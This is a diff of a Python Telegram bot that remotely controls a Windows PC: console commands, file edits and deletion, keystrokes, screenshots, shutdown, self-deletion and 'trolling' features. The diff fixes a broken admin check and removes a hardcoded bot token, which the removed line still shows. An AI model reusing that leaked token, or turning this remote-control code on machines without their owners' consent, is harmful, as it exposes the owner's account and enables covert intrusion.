@@ -19,14 +19,16 @@ FAST_CMDS = ['tasklist', 'ping']  # Быстрые команды (исполь�
 TROLL_WEBSITES = ['https://dzen.ru', 'https://youtube.com', 'https://www.google.com', 'https://yandex.ru', 'https://vk.com']  # Сайты для открытия в троллинге (используются при троллинге массовым открытием сайтов)
 
 VERSION = '3.6'  # Версия бота
-TOKEN = "6827727968:AAFlwV4bxllXyiitYn8hHBeYmCKg4mKNFPw"  # Токен бота
+TOKEN = ""  # Токен бота
 FIRST_ID = 1215122907  # ID главного админа (обязтаельно к заполнению)
 SECOND_ID = 0  # ID второго админа (необязательно к заполнению). Оставьте 0, если в нем нет необходимости
 
 SAMP_ROUTE = ""  # Оставьте пустым, если не хотите использовать функции запуска SAMP. Используйте двойной слэш (\\) вместо одинарного
 RAKLITE_ROUTE = ""  # Оставьте пустым, если не хотите использовать функции запуска RakSamp Lite. Используйте двойной слэш (\\) вместо одинарного
 
-bot = TeleBot(TOKEN, parse_mode=None)  #Токен
+LOGGING = True  # Включить логгирование всех, кто пытается использовать бота (True - логировать / False - нет)
+
+bot = TeleBot(TOKEN, parse_mode=None)  #Токен 
 pyautogui.FAILSAFE = False
 
 #//////////////////////////////////////////////////////////
@@ -38,8 +40,11 @@ def make_temp_folder():
     return True
 
 
-def is_access_denied(id: int):
-    return not (id != FIRST_ID or id != SECOND_ID)
+def is_access_denied(member: types.User):
+    if LOGGING: print(member.id, member.username, member.first_name, sep='|')
+
+    if member.id == bot.user.id: return False
+    if member.id != FIRST_ID and member.id != SECOND_ID: return True
 
 
 #//////////////////////////////////////////////////////////
@@ -67,7 +72,7 @@ def start(message: types.Message):
     return mainmenu(message)
 
 def mainmenu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("/start", "Консоль", "Настройки ПК", "Файлы и папки", "Клавиши", "Троллинг",
                                                                                              "SAMP функции", "Меню биндов", "Особые функции")
@@ -75,7 +80,7 @@ def mainmenu(message: types.Message):
     return bot.register_next_step_handler(message, check_main)
 
 def check_main(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Файлы и папки': return files_menu(message)
@@ -92,7 +97,7 @@ def check_main(message: types.Message):
 
 
 def console_commands(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == 'Назад': return console_menu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -121,7 +126,7 @@ def console_commands(message: types.Message):
 
 
 def python_scripts(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
 
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return console_menu(message)
@@ -138,7 +143,7 @@ def python_scripts(message: types.Message):
 
 
 def create_file(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return files_menu(message)
@@ -154,7 +159,7 @@ def create_file(message: types.Message):
         return files_menu(message)
 
 def create_file_check(message: types.Message, route: str):
-    if is_access_denied(message.chat.id): return None      
+    if is_access_denied(message.from_user): return None      
     
     if message.text.strip() == '/start': return start(message)
 
@@ -164,14 +169,14 @@ def create_file_check(message: types.Message, route: str):
 
 
 def change_file_menu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Добавить содержимое", "Полностью изменить содержимое", "Очистить файл", "Назад")
     bot.send_message(message.chat.id, '*✍️ Выберите действие!*', reply_markup=markup, parse_mode="Markdown")
     return bot.register_next_step_handler(message, change_file_check)
     
 def change_file_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == 'Назад': return files_menu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -184,14 +189,14 @@ def change_file_check(message: types.Message):
 
 
 def change_file(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = False, resize_keyboard = True).add("Назад")
     bot.send_message(message.chat.id, '✍️ *Укажите путь до файла(если файл находятся в исполняемой папке, просто напишите название)*', parse_mode="Markdown", reply_markup=markup)
     return bot.register_next_step_handler(message, change_file_new_content)
 
 def change_file_new_content(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return change_file_menu(message)
@@ -200,7 +205,7 @@ def change_file_new_content(message: types.Message):
     return bot.register_next_step_handler(message, change_file_finish, message.text.strip())
 
 def change_file_finish(message: types.Message, route: str):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     try:
         if message.text.strip() == '/start': return start(message)
@@ -216,14 +221,14 @@ def change_file_finish(message: types.Message, route: str):
 
 
 def clean_file(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
     bot.send_message(message.chat.id, '✍️ *Укажите путь до файла(если файл находятся в исполняемой папке, просто напишите название)*', parse_mode="Markdown", reply_markup=markup)
     return bot.register_next_step_handler(message, clean_file_check)
 
 def clean_file_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return change_file_menu(message)
@@ -239,14 +244,14 @@ def clean_file_check(message: types.Message):
 
 
 def add_in_file_content(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = False, resize_keyboard = True).add("Назад")
     bot.send_message(message.chat.id, '✍️ *Введите название файла с расширением или путь до нужного файла*', parse_mode='Markdown', reply_markup=markup)
     return bot.register_next_step_handler(message, add_in_file_text)
 
 def add_in_file_text(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад':return change_file_menu(message)
@@ -255,7 +260,7 @@ def add_in_file_text(message: types.Message):
     return bot.register_next_step_handler(message, add_in_file_finish, message.text.strip())
 
 def add_in_file_finish(message: types.Message, route: str):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return change_file_menu(message)
@@ -271,14 +276,14 @@ def add_in_file_finish(message: types.Message, route: str):
 
 
 def delete_menu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Удалить файл", "Удалить папку", "Назад")
     bot.send_message(message.chat.id, '✍️ *Выберите то, что необходимо*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, check_delete_menu)
 
 def check_delete_menu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return files_menu(message)
@@ -290,14 +295,14 @@ def check_delete_menu(message: types.Message):
 
 
 def delete_file(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
     bot.send_message(message.chat.id, '*✍️ Введите путь к файлу, который надо удалить (либо просто название файла с расширением, если он в текущей папке)!*', parse_mode='Markdown', reply_markup=markup)
     return bot.register_next_step_handler(message, delete_file_check)
 
 def delete_file_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return delete_menu(message)
@@ -312,14 +317,14 @@ def delete_file_check(message: types.Message):
 
 
 def delete_folder(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
     bot.send_message(message.chat.id, '*✍️ Введите путь к папке, которую надо удалить!*', parse_mode='Markdown', reply_markup=markup)
     return bot.register_next_step_handler(message, delete_folder_check)
 
 def delete_folder_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return delete_menu(message)
@@ -334,14 +339,14 @@ def delete_folder_check(message: types.Message):
 
 
 def download_on_pc_menu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Выгрузить фото", "Выгрузить другое", "Назад")
     bot.send_message(message.chat.id, '*⚽️ Вы в меню выгрузки файлов!*', reply_markup=markup, parse_mode="Markdown")
     bot.register_next_step_handler(message, check_download_on_pc)
 
 def check_download_on_pc(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == 'Назад': return files_menu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -360,7 +365,7 @@ def check_download_on_pc(message: types.Message):
 
 
 def download_file_on_pc(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return download_file_on_pc1(message)
@@ -369,7 +374,7 @@ def download_file_on_pc(message: types.Message):
     return bot.register_next_step_handler(message, download_file_on_pc1, message.text.strip())
 
 def download_file_on_pc1(message: types.Message, route: str):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
         
     file_info = bot.get_file(message.document.file_id)
     downloaded_file = bot.download_file(file_info.file_path)
@@ -385,7 +390,7 @@ def download_file_on_pc1(message: types.Message, route: str):
 
 
 def download_photo(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return download_file_on_pc1(message)
@@ -394,7 +399,7 @@ def download_photo(message: types.Message):
     return bot.register_next_step_handler(message, download_photo_on_pc, message.text.strip())
 
 def download_photo_on_pc(message: types.Message, route: str):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
     downloaded_file = bot.download_file(file_info.file_path)
@@ -409,7 +414,7 @@ def download_photo_on_pc(message: types.Message, route: str):
 
 
 def files_menu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Создание файлов/папок", "Удаление файлов/папок", "Изменение файлов", "Запустить файл/программу",
                                                                                              "Скачать файл с ПК", "Выгрузить файл на ПК", "Назад")
@@ -417,7 +422,7 @@ def files_menu(message: types.Message):
     return bot.register_next_step_handler(message, files_menu_check)
 
 def files_menu_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Изменение файлов':  return change_file_menu(message)
@@ -444,7 +449,7 @@ def files_menu_check(message: types.Message):
 
 
 def check_create(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == 'Назад': return files_menu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -462,7 +467,7 @@ def check_create(message: types.Message):
     return files_menu(message)
 
 def create_folder(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
 
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return files_menu(message)
@@ -476,7 +481,7 @@ def create_folder(message: types.Message):
 
 
 def download_file(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return files_menu(message)
@@ -488,7 +493,7 @@ def download_file(message: types.Message):
 
 
 def open_file(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == "/start": return start(message)
     elif message.text.strip() == 'Назад': return files_menu(message)
@@ -500,9 +505,8 @@ def open_file(message: types.Message):
     return files_menu(message)
 
 
-
 def create_error(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return console_menu(message)
@@ -511,7 +515,7 @@ def create_error(message: types.Message):
     return bot.register_next_step_handler(message, create_error_check, message.text.strip())
 
 def create_error_check(message: types.Message, title: str):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return console_menu(message)
@@ -522,7 +526,7 @@ def create_error_check(message: types.Message, title: str):
 
 
 def console_menu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard=True).add("Ввод команд", "Запустить Python скрипт", "Сделать скриншот", "Открыть сайт",
                "Создать ошибку", "Список процессов", "Назад")
@@ -530,7 +534,7 @@ def console_menu(message: types.Message):
     return bot.register_next_step_handler(message, console_menu_check)
 
 def console_menu_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == 'Назад': return mainmenu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -572,7 +576,7 @@ def console_menu_check(message: types.Message):
 
 
 def process_list(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     processes = 'Список процессов:\n\n'
     for i in psutil.pids():
@@ -590,7 +594,7 @@ def process_list(message: types.Message):
     return bot.register_next_step_handler(message, check_process_list)
 
 def check_process_list(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == 'Назад': return console_menu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -612,7 +616,7 @@ def check_process_list(message: types.Message):
 
 
 def open_site(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == 'Назад': return console_menu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -623,14 +627,14 @@ def open_site(message: types.Message):
 
 
 def media_keys(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Пауза/Старт", "Перемотка вперёд", "Назад")
     bot.send_message(message.chat.id, '⌨️ *Вы в меню медиа-клавиш!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, media_keys_check)
 
 def media_keys_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return keyboard_menu(message)
@@ -641,14 +645,14 @@ def media_keys_check(message: types.Message):
 
 
 def keyboard_menu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Напечатать что-то", "Нажать клавиши", "Медиа-клавиши", "Назад")
     bot.send_message(message.chat.id, '⌨️ *Вы в меню клавиатуры!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, keyboard_check)
 
 def keyboard_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == 'Назад': return mainmenu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -661,14 +665,14 @@ def keyboard_check(message: types.Message):
 
 
 def keyboard_write(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add(*FAST_KEYS, "Назад", row_width=2)
     bot.send_message(message.chat.id, '⌨️ *Впишите то, что хотите написать c помощью клавиатуры, или выберите горячие клавиши из списка ниже!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, keyboard_write_check)
 
 def keyboard_write_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == "Назад": return keyboard_menu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -679,14 +683,14 @@ def keyboard_write_check(message: types.Message):
 
 
 def keyboard_keys(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add(*FAST_KEYS, "Назад", row_width=2)
     bot.send_message(message.chat.id, '⌨️ *Впишите или выберите ниже то, что хотите выполнить!\n\nПримеры:\nalt - нажмется только alt\nalt+f4 - alt и f4 нажмутся вместе*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, keyboard_keys_check)
 
 def keyboard_keys_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == "Назад": return keyboard_menu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -698,14 +702,14 @@ def keyboard_keys_check(message: types.Message):
 
 
 def samp_menu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Подключение к SAMP серверу", "Подключение к RakLaunch Lite", "Назад")
     bot.send_message(message.chat.id, '*😇 Вы в меню SAMP!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, samp_check)
 
 def samp_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == "Назад": return mainmenu(message)
     elif message.text.strip() == "/start": return start(message)
@@ -724,7 +728,7 @@ def samp_check(message: types.Message):
 
 
 def samp_connect(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return samp_menu(message)
@@ -738,7 +742,7 @@ def samp_connect(message: types.Message):
     return samp_menu(message)
 
 def raklite_connect(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return samp_menu(message)
@@ -758,7 +762,7 @@ def raklite_connect(message: types.Message):
 
 
 def other_functions(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Перезагрузка ПК", "Выход из учетки ПК", "Выключение ПК",
                                                                                              "Фикс раздвоения", "Выход из скрипта", "Удаление папки со скриптом", "Назад")
@@ -767,7 +771,7 @@ def other_functions(message: types.Message):
 
 
 def check_other(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return mainmenu(message)
@@ -785,14 +789,14 @@ def check_other(message: types.Message):
 
 
 def reboot(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Да, подтверждаю", "Нет, я передумал")
     bot.send_message(message.chat.id, '😢 *Подтвердите перезагрузку ПК!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, reboot_check)
 
 def reboot_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Да, подтверждаю':
@@ -806,14 +810,14 @@ def reboot_check(message: types.Message):
 
 
 def off_computer(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Да, подтверждаю", "Нет, я передумал")
     bot.send_message(message.chat.id, '😢 *Подтвердите выключение ПК!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, off_computer_check)
 
 def off_computer_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Да, подтверждаю':
@@ -827,14 +831,14 @@ def off_computer_check(message: types.Message):
 
 
 def logout(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Да, подтверждаю", "Нет, я передумал")
     bot.send_message(message.chat.id, '😢 *Подтвердите выход из учетной записи!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, logout_check)
 
 def logout_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Да, подтверждаю':
@@ -846,14 +850,14 @@ def logout_check(message: types.Message):
 
 
 def script_exit(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Да, подтверждаю", "Нет, я передумал")
     bot.send_message(message.chat.id, '😢 *Подтвердите выключение скрипта!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, check_exit)
 
 def check_exit(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Да, подтверждаю':
@@ -865,14 +869,14 @@ def check_exit(message: types.Message):
 
 
 def packs(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Открытие сайтов", "Открытие проводника", "Перемещение мышки", "start %0 %0", "Назад")
     bot.send_message(message.chat.id, '👺 *Вы в меню троллинга!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, check_packs)
 
 def check_packs(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start': return start(message)
     elif message.text.strip() == 'Назад': return mainmenu(message)
@@ -898,7 +902,7 @@ def check_packs(message: types.Message):
 
 
 def mouse_troll(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     xmouse = message.text.strip()
     if xmouse == "/start": return start(message)
@@ -917,7 +921,7 @@ def mouse_troll(message: types.Message):
 
 
 def troll_provod(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     xexplorer = message.text.strip()
     if xexplorer == "/start": return start(message)
@@ -933,7 +937,7 @@ def troll_provod(message: types.Message):
 
 
 def troll_site(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     xsite = message.text.strip()
     if xsite == "/start": return start(message)
@@ -951,13 +955,13 @@ def troll_site(message: types.Message):
 
 
 def full_delete(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     bot.send_message(message.chat.id, f"import shutil\n\nshutil.rmtree('{os.path.abspath(os.curdir)}')")
     return bot.register_next_step_handler(message, full_delete_open)
 
 def full_delete_open(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == "/start": return start(message)
     if os.path.exists('C:\\temp') == False: make_temp_folder()
@@ -1070,14 +1074,14 @@ class Sound:
 
 
 def pc_settings(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Изменить яркость", "Информация о ПК", "Изменить громкость", "Назад")
     bot.send_message(message.chat.id, '🔧 *Вы в меню настроек ПК!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, pc_settings_check)
 
 def pc_settings_check(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == 'Назад': return mainmenu(message)
     elif message.text.strip() == '/start': return start(message)
@@ -1112,14 +1116,14 @@ def pc_settings_check(message: types.Message):
 
 
 def volume_set(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
     bot.send_message(message.chat.id, f'🔧 *Введите уровень грокмоксти (0-100)!\n\nТекущий уровень - {Sound.current_volume()}*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, check_volume_set)
 
 def check_volume_set(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     level = message.text.strip()
     if level  == 'Назад': return pc_settings(message)
@@ -1136,14 +1140,14 @@ def check_volume_set(message: types.Message):
 
 
 def brightness_set(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
     bot.send_message(message.chat.id, f'🔧 *Введите уровень яркости (0-100)!\n\nТекущий уровень - {get_brightness()}*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, check_brightness_set)
 
 def check_brightness_set(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     level = message.text.strip()
     if level  == 'Назад': return pc_settings(message)
@@ -1211,14 +1215,14 @@ class bindAPI:
 
 
 def bind_menu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Создать бинд", "Использовать бинд", "Удалить бинд", "Назад")
     bot.send_message(message.chat.id, '😏 *Вы в меню использования биндов!*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, check_bind_menu)
 
 def check_bind_menu(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     if message.text.strip() == '/start' or message.text.strip() == 'Назад': return mainmenu(message)
     elif message.text.strip() == 'Использовать бинд': return choose_bind(message)
@@ -1230,26 +1234,26 @@ def check_bind_menu(message: types.Message):
 
 
 def bind_create(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
     bot.send_message(message.chat.id, '😏 *Вы в меню создания биндов!\nВведите имя нового бинда без расширения .bind*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, bind_create_text)
 
 def bind_create_text(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
-    if message.text.strip == "/start": return start(message)
-    elif message.text.strip == "Назад": return bind_menu(message)
+    if message.text.strip() == "/start": return start(message)
+    elif message.text.strip() == "Назад": return bind_menu(message)
         
     bot.send_message(message.chat.id, '😏 *Введите код бинда!*', parse_mode='Markdown')
     return bot.register_next_step_handler(message, bind_create_final, message.text.strip())
 
 def bind_create_final(message: types.Message, name: str):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
-    if message.text.strip == "/start": return start(message)
-    elif message.text.strip == "Назад": return bind_menu(message)
+    if message.text.strip() == "/start": return start(message)
+    elif message.text.strip() == "Назад": return bind_menu(message)
 
     try:
         with open(f'binds\\{name}.bind', 'w') as file:
@@ -1264,17 +1268,17 @@ def bind_create_final(message: types.Message, name: str):
 
 
 def bind_delete(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
     bot.send_message(message.chat.id, '😏 *Вы в меню удаления биндов!\nВведите имя уже существующего бинда для его удаления*', reply_markup=markup, parse_mode='Markdown')
     return bot.register_next_step_handler(message, check_bind_del)
 
 def check_bind_del(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
-    if message.text.strip == "/start": return start(message)
-    elif message.text.strip == "Назад": return bind_menu(message)
+    if message.text.strip() == "/start": return start(message)
+    elif message.text.strip() == "Назад": return bind_menu(message)
 
     if os.path.isfile(f"binds\\{message.text.strip()}.txt"):
         bot.send_message(message.chat.id, f'🤨 *Удаляю {message.text.strip()}.txt!*', parse_mode='Markdown')
@@ -1285,7 +1289,7 @@ def check_bind_del(message: types.Message):
     return bind_menu(message)
 
 def choose_bind(message: types.Message):
